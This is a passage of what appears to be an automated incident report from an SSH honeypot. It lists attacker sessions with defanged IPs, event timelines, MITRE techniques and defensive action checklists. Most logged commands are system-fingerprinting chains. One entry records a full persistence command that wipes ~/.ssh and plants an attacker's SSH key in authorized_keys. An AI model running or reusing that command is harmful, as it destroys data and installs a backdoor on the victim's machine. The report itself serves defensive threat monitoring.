| `2026-07-22 19:02:52` | `cowrie.client.version` |
| `2026-07-22 19:02:52` | `cowrie.client.kex` |
| `2026-07-22 19:02:53` | `cowrie.login.success` |
| `2026-07-22 19:02:54` | `cowrie.session.params` |
| `2026-07-22 19:02:54` | `cowrie.command.input` |
| `2026-07-22 19:02:54` | `cowrie.command.input` |
| `2026-07-22 19:02:54` | `cowrie.command.input` |
| `2026-07-22 19:02:54` | `cowrie.command.input` |
| `2026-07-22 19:02:54` | `cowrie.command.input` |
| `2026-07-22 19:02:54` | `cowrie.command.success` |
| `2026-07-22 19:02:54` | `cowrie.command.input` |
| `2026-07-22 19:02:54` | `cowrie.command.input` |
| `2026-07-22 19:02:54` | `cowrie.command.input` |
| `2026-07-22 19:02:54` | `cowrie.command.input` |
| `2026-07-22 19:02:54` | `cowrie.log.closed` |
| `2026-07-22 19:02:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a28e15bfb5b

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]3` |
| **First Seen** | 2026-07-22 19:03 |
| **Last Seen** | 2026-07-22 19:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:03:02` | `cowrie.session.connect` |
| `2026-07-22 19:03:02` | `cowrie.client.version` |
| `2026-07-22 19:03:02` | `cowrie.client.kex` |
| `2026-07-22 19:03:05` | `cowrie.login.success` |
| `2026-07-22 19:03:05` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]3` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c54d048736d

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]119` |
| **First Seen** | 2026-07-22 19:03 |
| **Last Seen** | 2026-07-22 19:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:03:17` | `cowrie.session.connect` |
| `2026-07-22 19:03:17` | `cowrie.client.version` |
| `2026-07-22 19:03:17` | `cowrie.client.kex` |
| `2026-07-22 19:03:20` | `cowrie.login.success` |
| `2026-07-22 19:03:20` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:03:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8882d9a88ed

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:04 |
| **Last Seen** | 2026-07-22 19:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:04:42` | `cowrie.session.connect` |
| `2026-07-22 19:04:43` | `cowrie.client.version` |
| `2026-07-22 19:04:43` | `cowrie.client.kex` |
| `2026-07-22 19:04:44` | `cowrie.login.success` |
| `2026-07-22 19:04:46` | `cowrie.session.params` |
| `2026-07-22 19:04:46` | `cowrie.command.input` |
| `2026-07-22 19:04:46` | `cowrie.command.input` |
| `2026-07-22 19:04:46` | `cowrie.command.input` |
| `2026-07-22 19:04:46` | `cowrie.command.input` |
| `2026-07-22 19:04:46` | `cowrie.command.input` |
| `2026-07-22 19:04:46` | `cowrie.command.success` |
| `2026-07-22 19:04:46` | `cowrie.command.input` |
| `2026-07-22 19:04:46` | `cowrie.command.input` |
| `2026-07-22 19:04:46` | `cowrie.command.input` |
| `2026-07-22 19:04:46` | `cowrie.command.input` |
| `2026-07-22 19:04:46` | `cowrie.log.closed` |
| `2026-07-22 19:04:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24a1c74a30dc

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 19:06 |
| **Last Seen** | 2026-07-22 19:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:06:26` | `cowrie.session.connect` |
| `2026-07-22 19:06:26` | `cowrie.client.version` |
| `2026-07-22 19:06:26` | `cowrie.client.kex` |
| `2026-07-22 19:06:26` | `cowrie.login.success` |
| `2026-07-22 19:06:27` | `cowrie.session.params` |
| `2026-07-22 19:06:27` | `cowrie.command.input` |
| `2026-07-22 19:06:27` | `cowrie.log.closed` |
| `2026-07-22 19:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57df8e88b064

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:06 |
| **Last Seen** | 2026-07-22 19:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:06:32` | `cowrie.session.connect` |
| `2026-07-22 19:06:32` | `cowrie.client.version` |
| `2026-07-22 19:06:32` | `cowrie.client.kex` |
| `2026-07-22 19:06:33` | `cowrie.login.success` |
| `2026-07-22 19:06:34` | `cowrie.session.params` |
| `2026-07-22 19:06:34` | `cowrie.command.input` |
| `2026-07-22 19:06:34` | `cowrie.command.input` |
| `2026-07-22 19:06:34` | `cowrie.command.input` |
| `2026-07-22 19:06:34` | `cowrie.command.input` |
| `2026-07-22 19:06:34` | `cowrie.command.input` |
| `2026-07-22 19:06:34` | `cowrie.command.success` |
| `2026-07-22 19:06:34` | `cowrie.command.input` |
| `2026-07-22 19:06:34` | `cowrie.command.input` |
| `2026-07-22 19:06:34` | `cowrie.command.input` |
| `2026-07-22 19:06:34` | `cowrie.command.input` |
| `2026-07-22 19:06:35` | `cowrie.log.closed` |
| `2026-07-22 19:06:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40c44e6a7a7a

| Field | Detail |
|---|---|
| **Source IP** | `103.83.23[.]169` |
| **First Seen** | 2026-07-22 19:06 |
| **Last Seen** | 2026-07-22 19:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:06:40` | `cowrie.session.connect` |
| `2026-07-22 19:06:41` | `cowrie.client.version` |
| `2026-07-22 19:06:41` | `cowrie.client.kex` |
| `2026-07-22 19:06:43` | `cowrie.login.success` |
| `2026-07-22 19:06:43` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.83.23[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.83.23[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3a67621133d

| Field | Detail |
|---|---|
| **Source IP** | `115.190.155[.]5` |
| **First Seen** | 2026-07-22 19:07 |
| **Last Seen** | 2026-07-22 19:12 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:07:08` | `cowrie.session.connect` |
| `2026-07-22 19:07:08` | `cowrie.client.version` |
| `2026-07-22 19:07:08` | `cowrie.client.kex` |
| `2026-07-22 19:07:11` | `cowrie.login.success` |
| `2026-07-22 19:12:11` | `cowrie.session.file_upload` |
| `2026-07-22 19:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.155[.]5` to AbuseIPDB if not already reported
- [ ] Block `115.190.155[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7553aa0b6fb9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:08 |
| **Last Seen** | 2026-07-22 19:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:08:21` | `cowrie.session.connect` |
| `2026-07-22 19:08:21` | `cowrie.client.version` |
| `2026-07-22 19:08:21` | `cowrie.client.kex` |
| `2026-07-22 19:08:22` | `cowrie.login.success` |
| `2026-07-22 19:08:23` | `cowrie.session.params` |
| `2026-07-22 19:08:23` | `cowrie.command.input` |
| `2026-07-22 19:08:23` | `cowrie.command.input` |
| `2026-07-22 19:08:23` | `cowrie.command.input` |
| `2026-07-22 19:08:23` | `cowrie.command.input` |
| `2026-07-22 19:08:23` | `cowrie.command.input` |
| `2026-07-22 19:08:23` | `cowrie.command.success` |
| `2026-07-22 19:08:23` | `cowrie.command.input` |
| `2026-07-22 19:08:23` | `cowrie.command.input` |
| `2026-07-22 19:08:23` | `cowrie.command.input` |
| `2026-07-22 19:08:23` | `cowrie.command.input` |
| `2026-07-22 19:08:23` | `cowrie.log.closed` |
| `2026-07-22 19:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e6918be2afc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:10 |
| **Last Seen** | 2026-07-22 19:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:10:14` | `cowrie.session.connect` |
| `2026-07-22 19:10:14` | `cowrie.client.version` |
| `2026-07-22 19:10:14` | `cowrie.client.kex` |
| `2026-07-22 19:10:16` | `cowrie.login.success` |
| `2026-07-22 19:10:17` | `cowrie.session.params` |
| `2026-07-22 19:10:17` | `cowrie.command.input` |
| `2026-07-22 19:10:17` | `cowrie.command.input` |
| `2026-07-22 19:10:17` | `cowrie.command.input` |
| `2026-07-22 19:10:17` | `cowrie.command.input` |
| `2026-07-22 19:10:17` | `cowrie.command.input` |
| `2026-07-22 19:10:17` | `cowrie.command.success` |
| `2026-07-22 19:10:17` | `cowrie.command.input` |
| `2026-07-22 19:10:17` | `cowrie.command.input` |
| `2026-07-22 19:10:17` | `cowrie.command.input` |
| `2026-07-22 19:10:17` | `cowrie.command.input` |
| `2026-07-22 19:10:17` | `cowrie.log.closed` |
| `2026-07-22 19:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58b97a31ae24

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-22 19:12 |
| **Last Seen** | 2026-07-22 19:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:12:01` | `cowrie.session.connect` |
| `2026-07-22 19:12:01` | `cowrie.client.version` |
| `2026-07-22 19:12:01` | `cowrie.client.kex` |
| `2026-07-22 19:12:02` | `cowrie.login.success` |
| `2026-07-22 19:12:02` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:12:02` | `cowrie.direct-tcpip.data` |
| `2026-07-22 19:12:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40d88931fbc1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:12 |
| **Last Seen** | 2026-07-22 19:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:12:04` | `cowrie.session.connect` |
| `2026-07-22 19:12:04` | `cowrie.client.version` |
| `2026-07-22 19:12:04` | `cowrie.client.kex` |
| `2026-07-22 19:12:05` | `cowrie.login.success` |
| `2026-07-22 19:12:06` | `cowrie.session.params` |
| `2026-07-22 19:12:06` | `cowrie.command.input` |
| `2026-07-22 19:12:06` | `cowrie.command.input` |
| `2026-07-22 19:12:06` | `cowrie.command.input` |
| `2026-07-22 19:12:06` | `cowrie.command.input` |
| `2026-07-22 19:12:06` | `cowrie.command.input` |
| `2026-07-22 19:12:06` | `cowrie.command.success` |
| `2026-07-22 19:12:06` | `cowrie.command.input` |
| `2026-07-22 19:12:06` | `cowrie.command.input` |
| `2026-07-22 19:12:06` | `cowrie.command.input` |
| `2026-07-22 19:12:06` | `cowrie.command.input` |
| `2026-07-22 19:12:06` | `cowrie.log.closed` |
| `2026-07-22 19:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ab239a8b941

| Field | Detail |
|---|---|
| **Source IP** | `207.154.230[.]149` |
| **First Seen** | 2026-07-22 19:12 |
| **Last Seen** | 2026-07-22 19:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:12:12` | `cowrie.session.connect` |
| `2026-07-22 19:12:12` | `cowrie.client.version` |
| `2026-07-22 19:12:12` | `cowrie.client.kex` |
| `2026-07-22 19:12:12` | `cowrie.login.success` |
| `2026-07-22 19:12:13` | `cowrie.session.params` |
| `2026-07-22 19:12:13` | `cowrie.command.input` |
| `2026-07-22 19:12:13` | `cowrie.command.failed` |
| `2026-07-22 19:12:14` | `cowrie.log.closed` |
| `2026-07-22 19:12:14` | `cowrie.session.params` |
| `2026-07-22 19:12:14` | `cowrie.command.input` |
| `2026-07-22 19:12:14` | `cowrie.session.file_download` |
| `2026-07-22 19:12:14` | `cowrie.log.closed` |
| `2026-07-22 19:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.230[.]149` to AbuseIPDB if not already reported
- [ ] Block `207.154.230[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50b0fc275cae

| Field | Detail |
|---|---|
| **Source IP** | `207.154.230[.]149` |
| **First Seen** | 2026-07-22 19:12 |
| **Last Seen** | 2026-07-22 19:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:12:15` | `cowrie.session.connect` |
| `2026-07-22 19:12:15` | `cowrie.client.version` |
| `2026-07-22 19:12:15` | `cowrie.client.kex` |
| `2026-07-22 19:12:15` | `cowrie.login.success` |
| `2026-07-22 19:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.230[.]149` to AbuseIPDB if not already reported
- [ ] Block `207.154.230[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce47a7b6b315

| Field | Detail |
|---|---|
| **Source IP** | `207.154.230[.]149` |
| **First Seen** | 2026-07-22 19:12 |
| **Last Seen** | 2026-07-22 19:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:12:15` | `cowrie.session.connect` |
| `2026-07-22 19:12:15` | `cowrie.client.version` |
| `2026-07-22 19:12:15` | `cowrie.client.kex` |
| `2026-07-22 19:12:16` | `cowrie.login.success` |
| `2026-07-22 19:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.230[.]149` to AbuseIPDB if not already reported
- [ ] Block `207.154.230[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-531240d9185e

| Field | Detail |
|---|---|
| **Source IP** | `122.187.237[.]122` |
| **First Seen** | 2026-07-22 19:13 |
| **Last Seen** | 2026-07-22 19:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:13:12` | `cowrie.session.connect` |
| `2026-07-22 19:13:13` | `cowrie.client.version` |
| `2026-07-22 19:13:13` | `cowrie.client.kex` |
| `2026-07-22 19:13:15` | `cowrie.login.success` |
| `2026-07-22 19:13:15` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:13:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.237[.]122` to AbuseIPDB if not already reported
- [ ] Block `122.187.237[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3dff482b179

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:13 |
| **Last Seen** | 2026-07-22 19:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:13:49` | `cowrie.session.connect` |
| `2026-07-22 19:13:49` | `cowrie.client.version` |
| `2026-07-22 19:13:49` | `cowrie.client.kex` |
| `2026-07-22 19:13:50` | `cowrie.login.success` |
| `2026-07-22 19:13:51` | `cowrie.session.params` |
| `2026-07-22 19:13:51` | `cowrie.command.input` |
| `2026-07-22 19:13:51` | `cowrie.command.input` |
| `2026-07-22 19:13:51` | `cowrie.command.input` |
| `2026-07-22 19:13:51` | `cowrie.command.input` |
| `2026-07-22 19:13:51` | `cowrie.command.input` |
| `2026-07-22 19:13:51` | `cowrie.command.success` |
| `2026-07-22 19:13:51` | `cowrie.command.input` |
| `2026-07-22 19:13:51` | `cowrie.command.input` |
| `2026-07-22 19:13:51` | `cowrie.command.input` |
| `2026-07-22 19:13:51` | `cowrie.command.input` |
| `2026-07-22 19:13:52` | `cowrie.log.closed` |
| `2026-07-22 19:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30d7c3214486

| Field | Detail |
|---|---|
| **Source IP** | `42.248.129[.]234` |
| **First Seen** | 2026-07-22 19:15 |
| **Last Seen** | 2026-07-22 19:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:15:05` | `cowrie.session.connect` |
| `2026-07-22 19:15:05` | `cowrie.client.version` |
| `2026-07-22 19:15:05` | `cowrie.client.kex` |
| `2026-07-22 19:15:07` | `cowrie.login.success` |
| `2026-07-22 19:15:07` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:15:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.248.129[.]234` to AbuseIPDB if not already reported
- [ ] Block `42.248.129[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e239943cce9

| Field | Detail |
|---|---|
| **Source IP** | `124.67.120[.]106` |
| **First Seen** | 2026-07-22 19:15 |
| **Last Seen** | 2026-07-22 19:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
